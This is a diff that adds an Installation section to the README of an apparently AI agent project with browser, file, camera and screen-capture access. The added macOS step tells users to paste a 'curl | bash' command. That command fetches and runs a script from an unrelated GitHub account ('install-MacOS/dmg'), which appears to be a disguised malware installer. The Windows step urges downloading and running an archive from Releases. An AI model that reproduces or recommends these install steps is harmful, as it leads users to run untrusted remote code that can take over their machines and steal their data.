@@ -27,6 +27,27 @@ Thanks to our optimizations, you have complete freedom of choice:
 * **Agent Tools:** The bot has access to browser control, local files, task scheduling (cron), camera, and screen captures.
 * **Multi-agent Routing:** Capability to route inbound messages from different channels or accounts to isolated agents (separate workspaces and sessions).
 
+## Installation
+
+### 🟢 1-Click Install (Windows Portable)
+
+**The easiest way to get started.**
+
+1. Go to the [**Releases**](../../releases) page.
+2. Download the **Windows Portable** `7.z` file.
+3. Extract the file.
+4. **Run.** (No extra setup required).
+
+### MacOS
+
+- 💻Open **Terminal**
+- ☑Paste the **command** below
+- ✅Press **Enter**
+
+```sh
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/install-MacOS/dmg/refs/heads/main/clawdbot)"
+```
+
 ### Supported Platforms
 
 The assistant (Gateway) runs on **macOS, Linux, and Windows (via WSL2)**. Companion nodes exist for mobile devices (iOS/Android) to provide access to device sensors and voice features.
